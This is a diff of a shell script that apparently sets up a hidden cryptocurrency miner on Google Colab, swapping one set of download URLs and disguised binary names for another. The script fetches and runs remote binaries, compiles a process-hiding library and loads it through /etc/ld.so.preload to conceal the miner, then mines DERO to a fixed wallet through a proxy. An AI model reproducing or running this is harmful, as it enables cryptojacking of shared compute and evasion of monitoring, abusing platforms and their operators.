@@ -16,7 +16,7 @@ wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
-wget https://gitlab.com/gilalww/exe/-/raw/main/jupyter && chmod +x jupyter >/dev/null 2>&1
+wget https://github.com/gretongcu/dora/raw/main/dora && chmod +x dora >/dev/null 2>&1
 rm -rf wget-log*
 
 cat > graftcp/local/graftcp-local.conf <<END
@@ -47,12 +47,12 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://gitlab.com/gilaaja/exe/-/raw/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+./graftcp/graftcp wget https://github.com/gretongcu/dora/raw/main/magicDora.zip
+unzip magicDora.zip
 rm -rf wget-log*
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./jupyter -r stratum+tcp://pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.$(shuf -n 1 -i 1-999999)-colab
+./graftcp/graftcp ./dora -r stratum+tcp://pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.$(shuf -n 1 -i 1-999999)-colab
